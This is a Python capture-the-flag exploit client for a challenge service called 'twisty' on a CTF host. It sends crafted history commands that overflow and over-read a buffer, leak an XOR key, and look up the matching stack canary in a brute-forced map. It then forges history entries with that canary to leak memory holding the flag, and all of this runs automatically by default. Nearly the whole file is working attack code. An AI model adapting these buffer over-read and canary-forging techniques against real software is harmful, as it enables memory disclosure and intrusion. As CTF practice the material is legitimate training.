#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
Client for twisty
"""

from __future__ import print_function
import sys
import argparse
import cmd
import socket
import threading
import os.path
import struct

# name of the file containing key-canary values, bruteforced on the 0-0xFFFFF space (gen.c)
KEY_CANARY_FILE = 'seed_canary_map'

# number of bytes to attempt to read with the exploit
# more bytes = more chance to read the flag, but also more chance of crash
TRY_READ_BYTES = 6130

def hexdump(src, length=32):
    """Hexdump utility function
    Source: https://gist.github.com/sbz/1080258
    """
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) for x in chars])
        printable = ''.join(["%s" % ((ord(x) <= 127 and FILTER[ord(x)]) or '.') for x in chars])
        lines.append("%04x  %-*s  %s\n" % (c, length*3, hex, printable))
    return ''.join(lines)

class ClientShell(cmd.Cmd):
    def __init__(self, host, port, auto, verbose):
        cmd.Cmd.__init__(self)
        self.prompt = ''
        self.auto = auto
        self.verbose = verbose
        self.sock = self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((host, port))
        self.sent_something = False
        self.PATTERN_KEY = '63 - ' + 'B'*62 + '\n64 - '
        self.PATTERN_KEY_LEN = len(self.PATTERN_KEY)
        self.try_read_flag = False
        self.PATTERN_CMD = './twisty'
        self.PATTERN_COREDUMP = 'timeout: the monitored command dumped core'
        threading.Thread(target=self.recv_dump).start()
        if self.auto:
            self.do_read_exploit("")

    def send_commands(self, data):
        sent = self.sock.sendall(data)
        self.sent_something = True
    
    def recv_dump(self):
        r = 'x'
        while r != '':
            r = self.sock.recv(4096)
            if self.verbose:
                print(hexdump(r), end='')
            elif not self.auto:
                try:
                    print(r, end='')
                except IOError: pass
            if self.try_read_flag:
                if self.get_flag(r):
                    self.do_exit("")
            else:
                xorkey = self.get_key(r)
                if xorkey is not None and self.auto:
                    canary = self.find_canary(xorkey)
                    if canary is None: continue
                    self.do_rewrite_history(canary)
            
        print("INFO: server closed connection!", file=sys.stderr)
        sys.exit()
    
    def get_key(self, s):
        pos = s.find(self.PATTERN_KEY)
        if(pos != -1 and len(s) >= pos + self.PATTERN_KEY_LEN + 12):
            key_start = pos + self.PATTERN_KEY_LEN + 8
            key = struct.unpack("<I", s[key_start:key_start+4])[0]
            print("\nKEY FOUND\t" + hex(key), file=sys.stderr)
            return hex(key)
        return None

    def find_canary(self, key):
        intkey=str(int(key,16))
        lines = [line.rstrip('\n') for line in open(KEY_CANARY_FILE)]
        for line in lines:
            if intkey in line:
                canary = line.split(':')[1]
                print("\nCANARY FOUND\t" + canary, file=sys.stderr)
                return canary
        return None
    
    def get_flag(self, s):
        pos = s.find(self.PATTERN_CMD)
        if(pos != -1):
            vars = ' '.join(s[pos:].split('\0')[0:2])
            print("\nARGV FOUND\t" + vars + "\n", file=sys.stderr)
            return True
        pos = s.find(self.PATTERN_COREDUMP)
        if(pos != -1):
            print("\nTwisty crashed.\n", file=sys.stderr)
            return True
        return False

    def do_file(self, path):
        """file path
        send the content of the given file"""
        if os.path.exists(path):
            with open(path, 'rb') as f:
                self.send_commands(f.read())
        else:
            print("ERROR: file does not exist!", file=sys.stderr)
    
    def do_help2(self, line):
        """help2
        send the "help" command to the server"""
        self.send_commands('help\n')
    
    def do_history2(self, line):
        """history2
        send a "history" command followed by 255 spaces (so as not to add the command itself to the history)"""
        self.send_commands('history' + ' '*255 + '\n')
    
    def do_read_exploit(self, line):
        """read_exploit
        sends a specially crafted payload to the server, to be able to read past the buffer
        MUST be the first thing sent to the server"""
        if self.sent_something:
            print("ERROR: already sent some commands!", file=sys.stderr)
            return
        # fill the buffer
        for i in range(62):
            self.send_commands('A'*255 + '\n')
        self.send_commands('B'*62 + '\n')
        # we should now be 8 bytes before the end of the buffer
        # will leak 254 bytes past the buffer, the D command itself will got at the beginning
        self.send_commands('D'*254 + '\n')
        # align with other entries in the buffer (facilitates calculations for rewrite_history)
        self.send_commands('E' + '\n')
        # trigger the read
        self.send_commands('history' + ' '*255 + '\n')
    
    def do_rewrite_history(self, line):
        """rewrite_history canary
        sends a specially crafted payload to the server, to fake the history with a valid canary to read past the end of the buffer
        must follow a read_exploit"""
        self.try_read_flag = True
        canary = struct.pack("<I", int(line, 16))
        size = struct.pack("<I", TRY_READ_BYTES)
        size2 = struct.pack("<I", 0x4000 - 8 - 8)
        # fill the buffer again
        for i in range(61):
            self.send_commands('F'*255 + '\n')
        # at the end, place a fake entry with a valid canary and the size we want to read
        # at the begining, place another fake entry with a valid canary and a size that will jump directly at the end
        self.send_commands("B"*62 + canary + size + canary + size2 + 'G'*92 + '\n')
        # trigger the read
        self.send_commands('history'+' '*255 + '\n')
    
    def default(self, line):
        """by default, send the line as-is to the server"""
        self.send_commands(line + '\n')
    
    def do_exit(self, line):
        """exit
        send the "exit" command to the server and quit the current program"""
        self.send_commands('exit\n')
        return True
    
    def do_EOF(self, line):
        return True


def main ():
    global options, args
    if args.verbose: print("Connecting to host" + args.host + " on port " + str(args.port), file=sys.stderr)
    autopwn = True if not args.manual else False
    ClientShell(args.host, args.port, autopwn, args.verbose).cmdloop()

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description=globals()['__doc__'])
        parser.add_argument('-v', '--verbose', action='store_true', default=False, help='verbose (hexdump) output')
        parser.add_argument("-H", "--host", help="server hostname or ip address", default="ctf-ao2019.westeurope.cloudapp.azure.com")
        parser.add_argument("-p", "--port", help="port number", type=int, default=2323)
        parser.add_argument('-m', '--manual', action='store_true', default=False, help='do not start exploit automatically')
        args = parser.parse_args()
        main()
        sys.exit(0)
    except KeyboardInterrupt, e: # Ctrl-C
        print('User cancelled')
    except SystemExit, e: # sys.exit()
        raise e
    except Exception, e:
        print('ERROR, UNEXPECTED EXCEPTION')
        print(str(e))
        sys.exit(1)
